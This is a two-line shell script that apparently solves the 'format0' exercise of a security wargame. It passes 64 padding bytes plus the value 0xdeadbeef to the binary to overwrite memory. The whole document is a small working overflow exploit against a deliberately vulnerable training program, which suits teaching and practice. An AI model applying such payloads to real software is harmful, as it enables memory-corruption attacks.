#!/bin/bash

./format0 $(python -c "print 'A'*64 + '\xef\xbe\xad\xde'")
